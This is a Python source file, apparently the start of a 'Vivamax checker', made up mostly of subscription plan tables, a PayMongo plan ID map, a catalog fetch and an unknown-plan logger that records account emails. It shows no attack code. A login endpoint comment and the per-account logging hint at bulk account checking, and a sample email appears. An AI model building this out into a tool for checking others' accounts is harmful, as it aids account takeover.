# vivamax_checker.py
import requests
from datetime import datetime
import os

# ============= DYNAMIC VIVAMAX PRODUCT CACHE =============
VIVAMAX_PRODUCTS = {}  # subscriptionId → plan info

VIVAMAX_FALLBACK_PLANS = {
    "one_month": {
        "title": "Vivamax Monthly",
        "price": "₱169.00",
        "duration": 1, "period": "month",
        "billing": "1 month", "concurrent_stream": 1
    },
    # ── Apple App Store plan IDs (not in web product catalog) ──────
    "one_month_app": {
        "title": "Vivamax Monthly (App)",
        "price": "₱169.00",
        "duration": 1, "period": "month",
        "billing": "1 month", "concurrent_stream": 1
    },
    "three_months_app": {
        "title": "Vivamax 3 Months (App)",
        "price": "₱419.00",
        "duration": 3, "period": "month",
        "billing": "3 months", "concurrent_stream": 1
    },
    "six_months_app": {
        "title": "Vivamax 6 Months (App)",
        "price": "₱769.00",
        "duration": 6, "period": "month",
        "billing": "6 months", "concurrent_stream": 1
    },
    "one_year_app": {
        "title": "Vivamax 1 Year (App)",
        "price": "₱1,420.00",
        "duration": 1, "period": "year",
        "billing": "1 year", "concurrent_stream": 1
    },
    "one_month_max2_app": {
        "title": "Vivamax Max 2 - 1 Month (App)",
        "price": "₱499.00",
        "duration": 1, "period": "month",
        "billing": "1 month", "concurrent_stream": 2
    },
    "three_months_max2_app": {
        "title": "Vivamax Max 2 - 3 Months (App)",
        "price": "₱1,350.00",
        "duration": 3, "period": "month",
        "billing": "3 months", "concurrent_stream": 2
    },
    "six_months_max2_app": {
        "title": "Vivamax Max 2 - 6 Months (App)",
        "price": "₱2,490.00",
        "duration": 6, "period": "month",
        "billing": "6 months", "concurrent_stream": 2
    },
    "one_year_max2_app": {
        "title": "Vivamax Max 2 - 1 Year (App)",
        "price": "₱4,790.00",
        "duration": 1, "period": "year",
        "billing": "1 year", "concurrent_stream": 2
    },
    "three_months_max3_app": {
        "title": "Vivamax Max 3 - 3 Months (App)",
        "price": "₱1,650.00",
        "duration": 3, "period": "month",
        "billing": "3 months", "concurrent_stream": 3
    },
    "six_months_max3_app": {
        "title": "Vivamax Max 3 - 6 Months (App)",
        "price": "₱3,290.00",
        "duration": 6, "period": "month",
        "billing": "6 months", "concurrent_stream": 3
    },
    "one_year_max3_app": {
        "title": "Vivamax Max 3 - 1 Year (App)",
        "price": "₱5,990.00",
        "duration": 1, "period": "year",
        "billing": "1 year", "concurrent_stream": 3
    },
    "six_months_max4_app": {
        "title": "Vivamax Max 4 - 6 Months (App)",
        "price": "₱3,990.00",
        "duration": 6, "period": "month",
        "billing": "6 months", "concurrent_stream": 4
    },
    "one_year_max4_app": {
        "title": "Vivamax Max 4 - 1 Year (App)",
        "price": "₱7,490.00",
        "duration": 1, "period": "year",
        "billing": "1 year", "concurrent_stream": 4
    },
    # ── Google Play plan IDs (_android suffix variants) ─────────────
    "one_month_android": {
        "title": "Vivamax Monthly (Android)",
        "price": "₱169.00",
        "duration": 1, "period": "month",
        "billing": "1 month", "concurrent_stream": 1
    },
    "three_months_android": {
        "title": "Vivamax 3 Months (Android)",
        "price": "₱419.00",
        "duration": 3, "period": "month",
        "billing": "3 months", "concurrent_stream": 1
    },
    "six_months_android": {
        "title": "Vivamax 6 Months (Android)",
        "price": "₱769.00",
        "duration": 6, "period": "month",
        "billing": "6 months", "concurrent_stream": 1
    },
    "one_year_android": {
        "title": "Vivamax 1 Year (Android)",
        "price": "₱1,420.00",
        "duration": 1, "period": "year",
        "billing": "1 year", "concurrent_stream": 1
    },
    "one_month_max2_android": {
        "title": "Vivamax Max 2 - 1 Month (Android)",
        "price": "₱499.00",
        "duration": 1, "period": "month",
        "billing": "1 month", "concurrent_stream": 2
    },
    "three_months_max2_android": {
        "title": "Vivamax Max 2 - 3 Months (Android)",
        "price": "₱1,350.00",
        "duration": 3, "period": "month",
        "billing": "3 months", "concurrent_stream": 2
    },
    "six_months_max2_android": {
        "title": "Vivamax Max 2 - 6 Months (Android)",
        "price": "₱2,490.00",
        "duration": 6, "period": "month",
        "billing": "6 months", "concurrent_stream": 2
    },
    "one_year_max2_android": {
        "title": "Vivamax Max 2 - 1 Year (Android)",
        "price": "₱4,790.00",
        "duration": 1, "period": "year",
        "billing": "1 year", "concurrent_stream": 2
    },
    "three_months_max3_android": {
        "title": "Vivamax Max 3 - 3 Months (Android)",
        "price": "₱1,650.00",
        "duration": 3, "period": "month",
        "billing": "3 months", "concurrent_stream": 3
    },
    "six_months_max3_android": {
        "title": "Vivamax Max 3 - 6 Months (Android)",
        "price": "₱3,290.00",
        "duration": 6, "period": "month",
        "billing": "6 months", "concurrent_stream": 3
    },
    "one_year_max3_android": {
        "title": "Vivamax Max 3 - 1 Year (Android)",
        "price": "₱5,990.00",
        "duration": 1, "period": "year",
        "billing": "1 year", "concurrent_stream": 3
    },
    "six_months_max4_android": {
        "title": "Vivamax Max 4 - 6 Months (Android)",
        "price": "₱3,990.00",
        "duration": 6, "period": "month",
        "billing": "6 months", "concurrent_stream": 4
    },
    "one_year_max4_android": {
        "title": "Vivamax Max 4 - 1 Year (Android)",
        "price": "₱7,490.00",
        "duration": 1, "period": "year",
        "billing": "1 year", "concurrent_stream": 4
    },
    "three_months": {
        "title": "Vivamax 3 Months",
        "price": "₱419.00",
        "duration": 3, "period": "month",
        "billing": "3 months", "concurrent_stream": 1
    },
    "six_months": {
        "title": "Vivamax 6 Months",
        "price": "₱769.00",
        "duration": 6, "period": "month",
        "billing": "6 months", "concurrent_stream": 1
    },
    "one_year": {
        "title": "Vivamax 1 Year",
        "price": "₱1,420.00",
        "duration": 1, "period": "year",
        "billing": "1 year", "concurrent_stream": 1
    },
    "one_month_max2": {
        "title": "Vivamax Max 2 - 1 Month",
        "price": "₱499.00",
        "duration": 1, "period": "month",
        "billing": "1 month", "concurrent_stream": 2
    },
    "three_months_max2": {
        "title": "Vivamax Max 2 - 3 Months",
        "price": "₱1,350.00",
        "duration": 3, "period": "month",
        "billing": "3 months", "concurrent_stream": 2
    },
    "six_months_max2": {
        "title": "Vivamax Max 2 - 6 Months",
        "price": "₱2,490.00",
        "duration": 6, "period": "month",
        "billing": "6 months", "concurrent_stream": 2
    },
    "one_year_max2": {
        "title": "Vivamax Max 2 - 1 Year",
        "price": "₱4,790.00",
        "duration": 1, "period": "year",
        "billing": "1 year", "concurrent_stream": 2
    },
    "three_months_max3": {
        "title": "Vivamax Max 3 - 3 Months",
        "price": "₱1,650.00",
        "duration": 3, "period": "month",
        "billing": "3 months", "concurrent_stream": 3
    },
    "six_months_max3": {
        "title": "Vivamax Max 3 - 6 Months",
        "price": "₱3,290.00",
        "duration": 6, "period": "month",
        "billing": "6 months", "concurrent_stream": 3
    },
    "one_year_max3": {
        "title": "Vivamax Max 3 - 1 Year",
        "price": "₱5,990.00",
        "duration": 1, "period": "year",
        "billing": "1 year", "concurrent_stream": 3
    },
    "six_months_max4": {
        "title": "Vivamax Max 4 - 6 Months",
        "price": "₱3,990.00",
        "duration": 6, "period": "month",
        "billing": "6 months", "concurrent_stream": 4
    },
    "one_year_max4": {
        "title": "Vivamax Max 4 - 1 Year",
        "price": "₱7,490.00",
        "duration": 1, "period": "year",
        "billing": "1 year", "concurrent_stream": 4
    },
    "maxone_bundle_ph_1month_web": {
        "title": "VMX+One PH - 1 Month",
        "price": "₱219.00",
        "duration": 1, "period": "month",
        "billing": "1 month", "concurrent_stream": 1
    },
    "maxone_bundle_ph_1year_web": {
        "title": "VMX+One PH - 1 Year",
        "price": "₱1,890.00",
        "duration": 1, "period": "year",
        "billing": "1 year", "concurrent_stream": 2
    },
    "maxone_bundle2_int_1month_web": {
        "title": "VMX+One Plan 2 - 1 Month",
        "price": "₱679.00",
        "duration": 1, "period": "month",
        "billing": "1 month", "concurrent_stream": 2
    },
    "maxone_bundle2_int_1year_web": {
        "title": "VMX+One Plan 2 - 1 Year",
        "price": "₱6,390.00",
        "duration": 1, "period": "year",
        "billing": "1 year", "concurrent_stream": 2
    },
    "vivaone_ph_one_month_no_ads_web": {
        "title": "Viva One - 1 Month",
        "price": "₱99.00",
        "duration": 1, "period": "month",
        "billing": "1 month", "concurrent_stream": 1
    },
    "vivaone_ph_three_months_no_ads_web": {
        "title": "Viva One - 3 Months",
        "price": "₱269.00",
        "duration": 3, "period": "month",
        "billing": "3 months", "concurrent_stream": 1
    },
    "vivaone_ph_six_months_no_ads_web": {
        "title": "Viva One - 6 Months",
        "price": "₱499.00",
        "duration": 6, "period": "month",
        "billing": "6 months", "concurrent_stream": 1
    },
    "vivaone_ph_one_year_no_ads_web": {
        "title": "Viva One - 1 Year",
        "price": "₱949.00",
        "duration": 1, "period": "year",
        "billing": "1 year", "concurrent_stream": 1
    },
    "vivaone_max2_one_month_web": {
        "title": "Viva One Max 2 - 1 Month",
        "price": "₱379.00",
        "duration": 1, "period": "month",
        "billing": "1 month", "concurrent_stream": 2
    },
    "vivaone_max2_three_months_web": {
        "title": "Viva One Max 2 - 3 Months",
        "price": "₱979.00",
        "duration": 3, "period": "month",
        "billing": "3 months", "concurrent_stream": 2
    },
    "vivaone_max2_six_months_web": {
        "title": "Viva One Max 2 - 6 Months",
        "price": "₱1,790.00",
        "duration": 6, "period": "month",
        "billing": "6 months", "concurrent_stream": 2
    },
    "vivaone_max2_one_year_web": {
        "title": "Viva One Max 2 - 1 Year",
        "price": "₱3,490.00",
        "duration": 1, "period": "year",
        "billing": "1 year", "concurrent_stream": 2
    },
    "vivamax_max2_one_month_ph_web": {
        "title": "Vivamax Max 2 - 1 Month",
        "price": "₱199.00",
        "duration": 1, "period": "month",
        "billing": "1 month", "concurrent_stream": 2
    },
    "vivaone_max2_one_month_ph_web": {
        "title": "Vivaone Max 2 - 1 Month",
        "price": "₱119.00",
        "duration": 1, "period": "month",
        "billing": "1 month", "concurrent_stream": 2
    },
    "onemax_max2_bundle_ph_1month_web": {
        "title": "Viva Max+One Plan Max 2 - 1 Month",
        "price": "₱259.00",
        "duration": 1, "period": "month",
        "billing": "1 month", "concurrent_stream": 2
    },
    "boxone_bundle_ph_1month_web": {
        "title": "Viva One+VMB - 1 Month",
        "price": "₱199.00",
        "duration": 1, "period": "month",
        "billing": "1 month", "concurrent_stream": 1
    },
    "vmb_one_week_ph_web": {
        "title": "VMB - 1 Week",
        "price": "₱69.00",
        "duration": 1, "period": "week",
        "billing": "1 week", "concurrent_stream": 1
    },
    "vmb_one_month_ph_web": {
        "title": "VMB - 1 Month",
        "price": "₱169.00",
        "duration": 1, "period": "month",
        "billing": "1 month", "concurrent_stream": 1
    },
    "vmb_one_year_ph_web": {
        "title": "VMB - 1 Year",
        "price": "₱1,420.00",
        "duration": 1, "period": "year",
        "billing": "1 year", "concurrent_stream": 1
    },
    "vivamax_one_week_ph_web": {
        "title": "Vivamax PH 1 Week",
        "price": "₱69.00",
        "duration": 7, "period": "day",
        "billing": "7 days", "concurrent_stream": 1
    },
    # ── Vivaoke / Record plans ──────────────────────────────────────
    "record_solo_1m_web": {
        "title": "Vivaoke Solo PH Plan - 1 Month",
        "price": "₱99.00",
        "duration": 1, "period": "month",
        "billing": "1 month", "concurrent_stream": 1
    },
    "record_solo_1y_web": {
        "title": "Vivaoke Solo PH Plan - 1 Year",
        "price": "₱949.00",
        "duration": 1, "period": "year",
        "billing": "1 year", "concurrent_stream": 1
    },
    # ── All Access bundle ───────────────────────────────────────────
    "mbundle_onemaxclubbox_web": {
        "title": "All Access (VMX+One+Club+Box) - 1 Month",
        "price": "₱369.00",
        "duration": 1, "period": "month",
        "billing": "1 month", "concurrent_stream": 1
    },
    # ── VMX Club solo plans ─────────────────────────────────────────
    "vmx_club_6-months": {
        "title": "VMX Club - 6 Months",
        "price": "₱499.00",
        "duration": 6, "period": "month",
        "billing": "6 months", "concurrent_stream": 1
    },
    "vmx_club_1-year": {
        "title": "VMX Club - 1 Year",
        "price": "₱949.00",
        "duration": 1, "period": "year",
        "billing": "1 year", "concurrent_stream": 1
    },
    # ── VMX Club + VMX Max 2 ────────────────────────────────────────
    "vmx_club+vmx_max2_1-year": {
        "title": "VMX Club + VMX Max 2 - 1 Year",
        "price": "₱6,390.00",
        "duration": 1, "period": "year",
        "billing": "1 year", "concurrent_stream": 2
    },
    # ── VMX Club + VMX + Vivaone ────────────────────────────────────
    "vmx_club+vmx_vivaone_6-month": {
        "title": "VMX Club + VMX + Vivaone - 6 Months",
        "price": "₱1,290.00",
        "duration": 6, "period": "month",
        "billing": "6 months", "concurrent_stream": 1
    },
    "vmx_club+vmx_vivaone_1-year": {
        "title": "VMX Club + VMX + Vivaone - 1 Year",
        "price": "₱2,350.00",
        "duration": 1, "period": "year",
        "billing": "1 year", "concurrent_stream": 1
    },
    # ── VMX Club + VMX + Vivaone Max 2 ─────────────────────────────
    "vmx_club+vmx_vivaone_max2_3-month": {
        "title": "VMX Club + VMX + Vivaone Max 2 - 3 Months",
        "price": "₱2,435.00",
        "duration": 3, "period": "month",
        "billing": "3 months", "concurrent_stream": 2
    },
    "vmx_club+vmx_vivaone_max2_6-month": {
        "title": "VMX Club + VMX + Vivaone Max 2 - 6 Months",
        "price": "₱4,520.00",
        "duration": 6, "period": "month",
        "billing": "6 months", "concurrent_stream": 2
    },
    "vmx_club+vmx_vivaone_max2_1-year": {
        "title": "VMX Club + VMX + Vivaone Max 2 - 1 Year",
        "price": "₱8,399.00",
        "duration": 1, "period": "year",
        "billing": "1 year", "concurrent_stream": 2
    },
    # ── VMX Club solo (short durations) ────────────────────────────
    "vmx_club_1-month": {
        "title": "VMX Club - 1 Month",
        "price": "₱99.00",
        "duration": 1, "period": "month",
        "billing": "1 month", "concurrent_stream": 1
    },
    "vmx_club_3-months": {
        "title": "VMX Club - 3 Months",
        "price": "₱269.00",
        "duration": 3, "period": "month",
        "billing": "3 months", "concurrent_stream": 1
    },
    # ── VMX Club Max 2 ──────────────────────────────────────────────
    "vmx_club_max2_1-month": {
        "title": "VMX Club Max 2 - 1 Month",
        "price": "₱379.00",
        "duration": 1, "period": "month",
        "billing": "1 month", "concurrent_stream": 2
    },
    "vmx_club_max2_3-month": {
        "title": "VMX Club Max 2 - 3 Months",
        "price": "₱979.00",
        "duration": 3, "period": "month",
        "billing": "3 months", "concurrent_stream": 2
    },
    "vmx_club_max2_6-months": {
        "title": "VMX Club Max 2 - 6 Months",
        "price": "₱1,790.00",
        "duration": 6, "period": "month",
        "billing": "6 months", "concurrent_stream": 2
    },
    "vmx_club_max2_1-year": {
        "title": "VMX Club Max 2 - 1 Year",
        "price": "₱3,490.00",
        "duration": 1, "period": "year",
        "billing": "1 year", "concurrent_stream": 2
    },
    # ── VMX Club + VMX ──────────────────────────────────────────────
    "vmx_club+vmx_1-month": {
        "title": "VMX Club + VMX - 1 Month",
        "price": "₱219.00",
        "duration": 1, "period": "month",
        "billing": "1 month", "concurrent_stream": 1
    },
    "vmx_club+vmx_3-month": {
        "title": "VMX Club + VMX - 3 Months",
        "price": "₱559.00",
        "duration": 3, "period": "month",
        "billing": "3 months", "concurrent_stream": 1
    },
    "vmx_club+vmx_6-month": {
        "title": "VMX Club + VMX - 6 Months",
        "price": "₱1,020.00",
        "duration": 6, "period": "month",
        "billing": "6 months", "concurrent_stream": 1
    },
    "vmx_club+vmx_1-year": {
        "title": "VMX Club + VMX - 1 Year",
        "price": "₱1,890.00",
        "duration": 1, "period": "year",
        "billing": "1 year", "concurrent_stream": 1
    },
    # ── VMX Club + VMX Max 2 (short durations) ─────────────────────
    "vmx_club+vmx_max2_1-month": {
        "title": "VMX Club + VMX Max 2 - 1 Month",
        "price": "₱679.00",
        "duration": 1, "period": "month",
        "billing": "1 month", "concurrent_stream": 2
    },
    "vmx_club+vmx_max2_3-month": {
        "title": "VMX Club + VMX Max 2 - 3 Months",
        "price": "₱1,850.00",
        "duration": 3, "period": "month",
        "billing": "3 months", "concurrent_stream": 2
    },
    "vmx_club+vmx_max2_6-month": {
        "title": "VMX Club + VMX Max 2 - 6 Months",
        "price": "₱3,490.00",
        "duration": 6, "period": "month",
        "billing": "6 months", "concurrent_stream": 2
    },
    # ── VMX Club + VMX + Vivaone (short durations) ─────────────────
    "vmx_club+vmx_vivaone_1-month": {
        "title": "VMX Club + VMX + Vivaone - 1 Month",
        "price": "₱269.00",
        "duration": 1, "period": "month",
        "billing": "1 month", "concurrent_stream": 1
    },
    "vmx_club+vmx_vivaone_3-month": {
        "title": "VMX Club + VMX + Vivaone - 3 Months",
        "price": "₱699.00",
        "duration": 3, "period": "month",
        "billing": "3 months", "concurrent_stream": 1
    },
    # ── VMX Club + VMX + Vivaone Max 2 (1 month) ───────────────────
    "vmx_club+vmx_vivaone_max2_1-month": {
        "title": "VMX Club + VMX + Vivaone Max 2 - 1 Month",
        "price": "₱869.00",
        "duration": 1, "period": "month",
        "billing": "1 month", "concurrent_stream": 2
    },
    # ── Viva One Max 3 ──────────────────────────────────────────────
    "vivaone_max3_three_months_web": {
        "title": "Viva One Max 3 - 3 Months",
        "price": "₱1,190.00",
        "duration": 3, "period": "month",
        "billing": "3 months", "concurrent_stream": 3
    },
    "vivaone_max3_six_months_web": {
        "title": "Viva One Max 3 - 6 Months",
        "price": "₱2,350.00",
        "duration": 6, "period": "month",
        "billing": "6 months", "concurrent_stream": 3
    },
    "vivaone_max3_one_year_web": {
        "title": "Viva One Max 3 - 1 Year",
        "price": "₱4,290.00",
        "duration": 1, "period": "year",
        "billing": "1 year", "concurrent_stream": 3
    },
    # ── Viva One Max 4 ──────────────────────────────────────────────
    "vivaone_max4_six_months_web": {
        "title": "Viva One Max 4 - 6 Months",
        "price": "₱2,850.00",
        "duration": 6, "period": "month",
        "billing": "6 months", "concurrent_stream": 4
    },
    "vivaone_max4_one_year_web": {
        "title": "Viva One Max 4 - 1 Year",
        "price": "₱5,390.00",
        "duration": 1, "period": "year",
        "billing": "1 year", "concurrent_stream": 4
    },
    # ── Viva One International ──────────────────────────────────────
    "vivaone_intl_2_one_month_web": {
        "title": "Viva One International - 1 Month",
        "price": "₱379.00",
        "duration": 1, "period": "month",
        "billing": "1 month", "concurrent_stream": 2
    },
    # ── Confirmed Google Play bare IDs (no _web suffix in API response) ─
    # Source: real API response from /v1/viva/login for Google Play accounts
    "vivaone_ph_one_month_no_ads": {
        "title": "Viva One - 1 Month",
        "price": "₱99.00",
        "duration": 1, "period": "month",
        "billing": "1 month", "concurrent_stream": 1
    },
    "vivaone_ph_three_months_no_ads": {
        "title": "Viva One - 3 Months",
        "price": "₱269.00",
        "duration": 3, "period": "month",
        "billing": "3 months", "concurrent_stream": 1
    },
    "vivaone_ph_six_months_no_ads": {
        "title": "Viva One - 6 Months",
        "price": "₱499.00",
        "duration": 6, "period": "month",
        "billing": "6 months", "concurrent_stream": 1
    },
    "vivaone_ph_one_year_no_ads": {
        "title": "Viva One - 1 Year",
        "price": "₱949.00",
        "duration": 1, "period": "year",
        "billing": "1 year", "concurrent_stream": 1
    },
    "vivaone_max2_one_month": {
        "title": "Viva One Max 2 - 1 Month",
        "price": "₱379.00",
        "duration": 1, "period": "month",
        "billing": "1 month", "concurrent_stream": 2
    },
    "vivaone_max2_three_months": {
        "title": "Viva One Max 2 - 3 Months",
        "price": "₱979.00",
        "duration": 3, "period": "month",
        "billing": "3 months", "concurrent_stream": 2
    },
    "vivaone_max2_six_months": {
        "title": "Viva One Max 2 - 6 Months",
        "price": "₱1,790.00",
        "duration": 6, "period": "month",
        "billing": "6 months", "concurrent_stream": 2
    },
    "vivaone_max2_one_year": {
        "title": "Viva One Max 2 - 1 Year",
        "price": "₱3,490.00",
        "duration": 1, "period": "year",
        "billing": "1 year", "concurrent_stream": 2
    },
    "maxone_bundle_ph_1month": {
        "title": "VMX+One PH - 1 Month",
        "price": "₱219.00",
        "duration": 1, "period": "month",
        "billing": "1 month", "concurrent_stream": 1
    },
    "maxone_bundle_ph_1year": {
        "title": "VMX+One PH - 1 Year",
        "price": "₱1,890.00",
        "duration": 1, "period": "year",
        "billing": "1 year", "concurrent_stream": 2
    },
    "vivamax_max2_one_month_ph": {
        "title": "Vivamax Max 2 - 1 Month",
        "price": "₱199.00",
        "duration": 1, "period": "month",
        "billing": "1 month", "concurrent_stream": 2
    },
    "vivaone_max2_one_month_ph": {
        "title": "Vivaone Max 2 - 1 Month",
        "price": "₱119.00",
        "duration": 1, "period": "month",
        "billing": "1 month", "concurrent_stream": 2
    },
    "onemax_max2_bundle_ph_1month": {
        "title": "Viva Max+One Plan Max 2 - 1 Month",
        "price": "₱259.00",
        "duration": 1, "period": "month",
        "billing": "1 month", "concurrent_stream": 2
    },
    "vivamax_one_week_ph": {
        "title": "Vivamax PH 1 Week",
        "price": "₱69.00",
        "duration": 7, "period": "day",
        "billing": "7 days", "concurrent_stream": 1
    },
}

# Auto-expand: for every suffixed fallback entry (_web, _android, _app),
# also register the bare name so Google Play / iOS / web subscriptions all
# resolve correctly regardless of which suffix the API omits or includes.
_suffix_expansions = {}
for _k, _v in list(VIVAMAX_FALLBACK_PLANS.items()):
    for _suffix in ("_web", "_android", "_app", "_google"):
        if _k.endswith(_suffix):
            _bare = _k[: -len(_suffix)]
            if _bare not in VIVAMAX_FALLBACK_PLANS and _bare not in _suffix_expansions:
                _suffix_expansions[_bare] = _v
            # Also cross-register: _android entry → _web key and vice versa
            for _other in ("_web", "_android", "_app"):
                _cross = _bare + _other
                if _cross not in VIVAMAX_FALLBACK_PLANS and _cross not in _suffix_expansions:
                    _suffix_expansions[_cross] = _v
VIVAMAX_FALLBACK_PLANS.update(_suffix_expansions)

# ============= PAYMONGO PLAN ID → SUBS_ID MAP =============
# Maps PayMongo plan IDs (e.g. "plan_fd838...") to their Vivamax subs_id.
# Built from the live /v1/product catalog. Used when subscriptionId is a
# PayMongo plan ID instead of a readable name.
PAYMONGO_PLAN_MAP = {
    "plan_fd8383633d2e26d8b9fe293f": "record_solo_1y_web",
    "plan_7897ffbd04c4911f1dd9108f": "record_solo_1m_web",
    "plan_EezfpD7DSP6de4zeWVgcXjWA": "vmx_club+vmx_max2_1-year",
    "plan_YboVR5B49qadfH2obrS2h1uC": "vmx_club+vmx_vivaone_1-year",
    "plan_6PkGRpBejSxEonsdVwiprreD": "vmx_club+vmx_vivaone_6-month",
    "plan_1tqTGe3x8zVD532gamLqsfE3": "vmx_club+vmx_vivaone_max2_1-year",
    "plan_Xea5xhfaL1xztZx5CwdqEy3d": "vmx_club_1-year",
    "plan_B1Hj7XK8N2PzVkq6TR7by46u": "vmx_club+vmx_vivaone_max2_6-month",
    "plan_fhVqwfHU6yuPPkYUb1c31SeT": "vmx_club_6-months",
    "plan_XuVmsAkax4WV2f7oSovQi9AU": "vmx_club+vmx_vivaone_max2_3-month",
    "plan_zg8LdcnH3miYZ21NRUfMNNC8": "vmx_club_3-months",
    "plan_W9t424SGEF9D46gq85U4NoNg": "vmx_club+vmx_vivaone_max2_1-month",
    "plan_fmWmQgep9xvGeDd8rHrt2rFE": "vmx_club_1-month",
    "plan_qE94mRemGFXDcX5EFt1ns4JP": "vmx_club+vmx_max2_6-month",
    "plan_EMYwQ7ns9oGHZdGJzTboGjVe": "vmx_club+vmx_max2_3-month",
    "plan_eN6DgBcW1BC5WKmj7CLL5eiV": "vmx_club+vmx_max2_1-month",
    "plan_2Pp5ufnAhJDMFM4d2b4cFM26": "vmx_club_max2_1-year",
    "plan_hCw6bSa1QTYhEKSBVaP3VcVE": "vmx_club_max2_6-months",
    "plan_oMWi3s3jvC2V7xHGpvdSW5vh": "vmx_club_max2_3-month",
    "plan_TZWwFUEUH4LgDexbn4Zc7goy": "vmx_club_max2_1-month",
    "plan_5qfkPkgyb9cPxPz3ZDB6XoaW": "vmx_club+vmx_vivaone_3-month",
    "plan_DBXF3uJgkL7M9PYoFppArpee": "vmx_club+vmx_vivaone_1-month",
    "plan_MG4MLxG43KiAz9Fjy8Z14hSU": "vmx_club+vmx_1-year",
    "plan_dXwjh9JvoNEKQ3npRyoXQfEh": "vmx_club+vmx_6-month",
    "plan_jtoGbfr4VSwFKfUR87EQwEnZ": "vmx_club+vmx_3-month",
    "plan_FsFcJx8S4PjfzcbWQikZYzmX": "maxone_bundle2_int_1month_web",
    "plan_45c7mXW4WQmkNTXT8uteFMDo": "vmx_club+vmx_1-month",
    "plan_rNjtgyb4fAwgoJT7sVNDLU9w": "maxone_bundle2_int_1year_web",
    "plan_DP6QLTAYJhpDSXHL8kDpACih": "maxone_bundle_ph_1year_web",
    "plan_8qF17H3wLH6XS9sxreidErmy": "vivaone_ph_six_months_no_ads_web",
    "plan_Mie54q5ug8beD9eRxTsXtsKR": "vivaone_ph_one_year_no_ads_web",
    "plan_rLeAfWuGSK7jQ24eD6o6jHGu": "vivaone_ph_one_month_no_ads_web",
    "plan_DU8hMtExxzGb78w5wG2i7Y7o": "maxone_bundle_ph_1month_web",
    "plan_KiEdzGfuXomcvBZFeHtZu3fo": "vivaone_ph_three_months_no_ads_web",
    "plan_cV6GivfxREJJEeCQSfSMxSgi": "vivaone_max4_one_year_web",
    "plan_MTU7xeNFD9S6xbCwHHamewMo": "vivaone_max4_six_months_web",
    "plan_GTU6GYi1mqeLUsJzuJBw4D6e": "vivaone_max3_one_year_web",
    "plan_HjMJePF9qfhrd3Jaw7VWkgve": "vivaone_max3_three_months_web",
    "plan_TyuyNsiDt5WjyCD3j1C28A5y": "vivaone_max2_one_year_web",
    "plan_QiRuDxUzaYC2rEujQDE47NUC": "vivaone_max3_six_months_web",
    "plan_HzawNW3Zw7U4A4LXeYkUNs4b": "vivaone_max2_three_months_web",
    "plan_A7kcMh9xUrhunZP97sDLPvFF": "vivaone_max2_six_months_web",
    "plan_3rswRoYdMocH9U1QD4xj7ESc": "vivaone_max2_one_month_web",
    "plan_kQgc4EQmzhxheLfmK6b7XucV": "one_month_web",
    "plan_4YYiZ8cjmfm8nRn5r3VnebKS": "six_months",
    "plan_bgVbqMvNBwDHMNiwUM5cTnHL": "one_year",
    "plan_LwkBghVGGoQ1egVsTHmQyvnX": "three_months",
    "plan_HhxwANdGMnx7hQRrF7S1fvXe": "one_year_max2",
    "plan_t9nf1m17R6cFntivYDNoibjj": "one_year_max3",
    "plan_1ztBmPi7kbYDtgYePKjNeALS": "one_month_max2",
    "plan_LKU6wPu1YmkUy6sxHRBAGJNn": "one_year_max4",
    "plan_UarpQK2MSmY5QhWpoPrdySBP": "six_months_max2",
    "plan_b1u1nR5KpUHqQ9XMLTuY9KpS": "six_months_max4",
    "plan_mURfpFmkLrffY8BbsMRiyZqg": "six_months_max3",
    "plan_BDgpoUoMyoD1fkKoWAwgmQBT": "three_months_max3",
    "plan_9mcmztcTX2agsEvi5qabzeLp": "three_months_max2",
}

async def load_vivamax_products():
    global VIVAMAX_PRODUCTS
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'x-appname': 'Vivamax/release-R60-6',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }

        print("🔄 Fetching Vivamax products from API...")
        resp = requests.get(
            'https://api2.vivamax.net/v1/product',
            headers=headers, timeout=20
        )
        resp.raise_for_status()

        data = resp.json()
        products = data.get('results', [])

        VIVAMAX_PRODUCTS.clear()

        # Load from API first — also build PayMongo reverse map live
        for p in products:
            subs_id = p.get('subs_id')
            if subs_id:
                plan_data = {
                    "price": p.get('price', 'N/A'),
                    "billing": f"{p.get('duration', 0)} {p.get('period', 'month')}",
                    "package": p.get('package', 'Unknown'),
                    "title": p.get('title', 'Unknown Plan'),
                    "duration": p.get('duration', 0),
                    "period": p.get('period', 'month'),
                    "concurrent_stream": p.get('concurrent_stream', 1),
                }
                VIVAMAX_PRODUCTS[subs_id] = plan_data
                # Also store without _web suffix
                stripped = subs_id.replace('_web', '')
                if stripped != subs_id:
                    VIVAMAX_PRODUCTS[stripped] = plan_data

                # Auto-update PayMongo map from live product data
                pm_id = p.get('paymongo_plan_id', '').strip()
                if pm_id and pm_id not in PAYMONGO_PLAN_MAP:
                    PAYMONGO_PLAN_MAP[pm_id] = subs_id

        # Merge fallback (only fills gaps, never overwrites API data)
        for subs_id, plan_data in VIVAMAX_FALLBACK_PLANS.items():
            if subs_id not in VIVAMAX_PRODUCTS:
                VIVAMAX_PRODUCTS[subs_id] = plan_data
            stripped = subs_id.replace('_web', '')
            if stripped not in VIVAMAX_PRODUCTS:
                VIVAMAX_PRODUCTS[stripped] = plan_data

        pm_count = sum(1 for v in PAYMONGO_PLAN_MAP.values() if v)
        print(f"✅ Total plans in cache: {len(VIVAMAX_PRODUCTS)} | PayMongo IDs mapped: {pm_count}")

    except Exception as e:
        print(f"❌ Failed to load from API, using fallback only: {e}")
        # If API fails entirely, still use fallback
        for subs_id, plan_data in VIVAMAX_FALLBACK_PLANS.items():
            VIVAMAX_PRODUCTS[subs_id] = plan_data
            stripped = subs_id.replace('_web', '')
            VIVAMAX_PRODUCTS[stripped] = plan_data
        print(f"✅ Loaded {len(VIVAMAX_PRODUCTS)} plans from fallback")

# ============= UNKNOWN PLAN LOGGER =============
_UNKNOWN_PLAN_LOG = "unknown_plans.log"
_seen_unknown_plans: set = set()  # in-memory dedup so we don't spam the file

def _log_unknown_plan(subs_id: str, email: str = "") -> None:
    """
    Append an unknown subscription ID to unknown_plans.log (one entry per unique ID).
    Duplicate IDs within the same session are suppressed.
    Each line format:
        2026-06-08 12:34:56 | vivaone_ph_one_month_no_ads | menjoartedot@gmail.com
    """
    if subs_id in _seen_unknown_plans:
        return
    _seen_unknown_plans.add(subs_id)
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        line = f"{timestamp} | {subs_id} | {email}\n"
        with open(_UNKNOWN_PLAN_LOG, "a", encoding="utf-8") as f:
            f.write(line)
        print(f"📝 [UNKNOWN PLAN LOGGED] → {_UNKNOWN_PLAN_LOG}")
